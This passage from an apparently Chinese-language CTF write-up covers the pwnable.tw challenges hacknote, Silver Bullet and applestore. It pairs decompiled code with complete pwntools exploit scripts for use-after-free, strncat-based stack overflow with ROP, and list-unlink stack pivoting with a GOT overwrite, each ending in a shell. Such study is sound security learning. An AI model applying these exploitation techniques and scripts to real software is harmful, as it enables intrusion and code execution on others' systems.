ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="comment"># r = elf.process()</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10102</span>)</span><br><span class="line"><span class="comment"># onegadget = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]</span></span><br><span class="line">onegadget = [<span class="number">0x3a819</span>,<span class="number">0x5f065</span>,<span class="number">0x5f066</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	r.sendline(<span class="string">'1'</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'ccc'</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'ddd'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">libc_base = u32(r.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">0x1b07b0</span></span><br><span class="line"><span class="comment"># print hex(48 + 0x18 + libc.sym['__malloc_hook'])</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># print hex(libc.sym['__malloc_hook'])</span></span><br><span class="line">rce = libc_base + onegadget[<span class="number">1</span>]</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(sys)+<span class="string">";sh\x00"</span>)</span><br><span class="line"><span class="comment"># add(8,p32(rce))</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><p>思路是将ptr改为printf打印出puts_got，之后同样的方法改为system即可</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote('chall.pwnable.tw',10102)</span></span><br><span class="line">p = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line">libc_elf = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_puts_addr = libc_elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libc_sys_addr = libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">puts_got_addr = <span class="number">0x0804A024</span></span><br><span class="line">print_content = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">32</span>,<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line">add_note(<span class="number">32</span>,<span class="string">"b"</span>*<span class="number">32</span>)</span><br><span class="line">free_note(<span class="number">0</span>)</span><br><span class="line">free_note(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">8</span>,p32(print_content)+p32(puts_got_addr))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">leak_puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> leak_puts_addr</span><br><span class="line">libcbase_addr = leak_puts_addr - libc_puts_addr</span><br><span class="line">system_addr = libcbase_addr + libc_sys_addr</span><br><span class="line"></span><br><span class="line">free_note(<span class="number">2</span>)</span><br><span class="line">add_note(<span class="number">8</span>,flat([system_addr,<span class="string">"||sh"</span>]))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x07-Silver-Bullet"><a href="#0x07-Silver-Bullet" class="headerlink" title="0x07 Silver Bullet"></a>0x07 Silver Bullet</h2><p>很有意思的题目</p>
<p><img src="https://i.loli.net/2020/12/15/EyClmD9KjWbcprH.png" alt="image-20201215161015680"></p>
<p>类似一个游戏，如果你的输入长度大于0x7fffffff，就可以杀死狼人</p>
<p>关键函数在于power up中</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">power_up</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need create the bullet first !"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't power up any more !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your another description of bullet :"</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));      <span class="comment">//限制输入长度</span></span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));   </span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your new power is : %u\n"</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;                         <span class="comment">//漏洞点</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enjoy it !"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>看样子程序会很严格的限制你的输入长度，不会让你的输入超出缓冲区，</p>
<p>但是有个致命错误在于v3(存放字节长度的变量)也会随之更新，并且没有限制power up的使用次数</p>
<p>所以比方说，我们先申请了40个字，然后power up了8个，那么现在的新长度就被更新到8</p>
<p>根据上面的程序可知，我们又有了0x30 - 8的输入空间，就可以造成栈溢出了</p>
<p>第一次溢出用ROP泄露libc</p>
<p>第二次覆盖返回地址位system即可</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./silver_bullet'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">'libc_32.so.6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10103</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">con</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Give me your description of bullet :"</span>,<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">con</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Give me your another description of bullet :"</span>,<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit0</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">46</span>)</span><br><span class="line">edit(<span class="string">'b'</span>*<span class="number">2</span>)</span><br><span class="line">edit(<span class="string">'\xff'</span>*<span class="number">7</span> + p32(puts_plt)+p32(<span class="number">0x8048954</span>)+p32(puts_got))</span><br><span class="line"></span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(<span class="string">'You win !!\n'</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">system = libc.sym[<span class="string">'system'</span>]</span><br><span class="line">str_sh = libc.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">info(<span class="built_in">hex</span>(system))</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">46</span>)</span><br><span class="line">edit(<span class="string">'b'</span>*<span class="number">2</span>)</span><br><span class="line">edit(<span class="string">'\xff'</span>*<span class="number">7</span> + p32(system)+p32(<span class="number">0x8048954</span>)+p32(str_sh) )</span><br><span class="line">beat()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x08-applestore"><a href="#0x08-applestore" class="headerlink" title="0x08 applestore"></a>0x08 applestore</h2><p>一道题想了整整一天，只能说思路真的很新奇，利用方法很巧妙</p>
<p>一个32位程序，买ipone然后加入购物车，还有计算账单和结账的功能</p>
<p>但是在IDA中的程序很奇怪，不太好分析，经过一顿动调之后才发现，是一个双向链表结构管理的</p>
<p>然后就开始一段漫长的改程序之旅，修改后的结构体如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> phone           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_5)</span><br><span class="line"><span class="number">00000000</span> name            dd ?</span><br><span class="line"><span class="number">00000004</span> price           dd ?</span><br><span class="line"><span class="number">00000008</span> bk              dd ?</span><br><span class="line"><span class="number">0000000</span>C fd              dd ?</span><br><span class="line"><span class="number">00000010</span> phone           ends</span><br></pre></td></tr></tbody></table></figure>

<p>修改代码之后可读性好了很多</p>
<p>插入函数：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">phone *__cdecl <span class="title">insert</span><span class="params">(phone *a1)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  phone *result; <span class="comment">// eax</span></span><br><span class="line">  phone *i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = (phone *)&amp;myCart; i-&gt;bk; i = (phone *)i-&gt;bk )</span><br><span class="line">    ;</span><br><span class="line">  i-&gt;bk = (<span class="keyword">int</span>)a1;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;fd = (<span class="keyword">int</span>)i;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>很明显它会一直遍历，将新节点加入链表的末尾</p>
<p>再看一下删除函数：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  phone *v2; <span class="comment">// [esp+14h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  phone *BK; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  phone *FD; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">1</span>;</span><br><span class="line">  v2 = (phone *)dword_804B070;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Item Number&gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;nptr, <span class="number">0x15</span>u);</span><br><span class="line">  idx = atoi(&amp;nptr);</span><br><span class="line">  <span class="keyword">while</span> ( v2 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v1 == idx )</span><br><span class="line">    {</span><br><span class="line">      BK = (phone *)v2-&gt;bk;</span><br><span class="line">      FD = (phone *)v2-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> ( FD )</span><br><span class="line">        FD-&gt;bk = (<span class="keyword">int</span>)BK;</span><br><span class="line">      <span class="keyword">if</span> ( BK )</span><br><span class="line">        BK-&gt;fd = (<span class="keyword">int</span>)FD;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Remove %d:%s from your shopping cart.\n"</span>, v1, v2-&gt;name);</span><br><span class="line">      <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">    }</span><br><span class="line">    ++v1;</span><br><span class="line">    v2 = (phone *)v2-&gt;bk;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v7;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里的逻辑就是常规的双向链表删除节点的操作，可以考虑进行类似unlink的利用</p>
<p>再看一下cart函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> total_price; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  phone *i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+26h] [ebp-22h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  total_price = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  my_read(&amp;buf, <span class="number">0x15</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">'y'</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==== Cart ===="</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = (phone *)dword_804B070; i; i = (phone *)i-&gt;bk )</span><br><span class="line">    {</span><br><span class="line">      v0 = v2++;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d: %s - $%d\n"</span>, v0, i-&gt;name, i-&gt;price);</span><br><span class="line">      total_price += i-&gt;price;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> total_price;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>功能是将链表上的iphone名字和价格打印出来，并返回总价格</p>
<p>关键点在于checkout的函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"*: iPhone 8 - $1"</span>);</span><br><span class="line">    asprintf(&amp;v2, <span class="string">"%s"</span>, <span class="string">"iPhone 8"</span>);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    insert((phone *)&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total: $%d\n"</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Want to checkout? Maybe next time!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>有一个彩蛋，如果购买的iphone总价格是7174元，那么就会将iphone8加入到链表末尾(1块钱就能买到iphone8！)</p>
<blockquote>
<p>这里有个知识点是asprintf函数，这是一个增强版的sprintf函数，为了避免缓冲区溢出，它可以动态分配内存空间，相当于malloc()</p>
</blockquote>
<p>这里会将把v2添加到链表末尾，重点是v2还是一个栈地址，那么我们能够控制它吗？</p>
<p>答案是可以的，我们可以看到cart函数的栈帧和checkout函数基本一样，cart函数的read()正好可以修改到这个位置，如果我们将v2改成某个函数的got表，那么通过cart函数就可以泄露出libc基址</p>
<p>所以思路有了，下一步就是要做到正确触发彩蛋，很简单写个脚本爆破一下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">199</span>*i+<span class="number">299</span>*j+<span class="number">499</span>*k+<span class="number">399</span>*m+<span class="number">199</span>*n == <span class="number">7174</span>):</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">"1:"</span>+<span class="built_in">str</span>(i)+<span class="string">" "</span>+<span class="string">"2:"</span>+<span class="built_in">str</span>(j)+<span class="string">" "</span>+<span class="string">"3:"</span>+<span class="built_in">str</span>(k)+<span class="string">" "</span>+<span class="string">"4:"</span>+<span class="built_in">str</span>(m)+<span class="string">" "</span>+<span class="string">"5:"</span>+<span class="built_in">str</span>(n)</span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line"><span class="comment">#1:6 2:20 3:0 4:0 5:0</span></span><br></pre></td></tr></tbody></table></figure>

<p>所以只要买6个(1)和20个(2)就正好是7174元</p>
<p>现在libc基址有了，就该考虑如何利用了</p>
<p><strong>整道题的核心就是控制ebp</strong></p>
<p>利用的就是delete函数</p>
<p><img src="https://i.loli.net/2020/12/17/HVaGcMygwkFnmTq.png" alt="image-20201217154252205"></p>
<p>如果我们能将栈迁移到atoi的got表处，那么我们就可以对got表进行改写</p>
<p>所以我们还需要想办法泄露栈的地址</p>
<p>在libc中保存了一个函数叫_environ，存的是当前进程的环境变量</p>
<p>通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p>
<p>利用和之前相同的方法，把栈地址泄露出来 可得偏移为0x104</p>
<p>然后构造payload可以修改最后一个节点的结构体</p>
<p><code>payload = '27' + p32(0) + p32(0)+p32(got_atoi + 0x22) + p32(stack - 0x8)</code></p>
<p>通过<code>FD-&gt;bk = (int)BK</code>就可以将ebp修改为got_atoi + 0x22，为什么要加0x22呢</p>
<p>因为handle函数里read的buf地址为[ebp-0x22]，所以这样我们就可以修改atoi的got表了</p>
<p>最后的最后，还要注意，在发生了read之后才会进入atoi，所以我们输入的system_addr的地址也会就进入到system函数中。不过有了hacknote的教训，我们知道，只需要加入一个<code>;</code>或者<code>||</code>就能够截断之前的字符串，于是我们可以发送: <code>p32(system_addr)+";/bin/sh"</code></p>
<p>综上，就可以完成这次攻击</p>
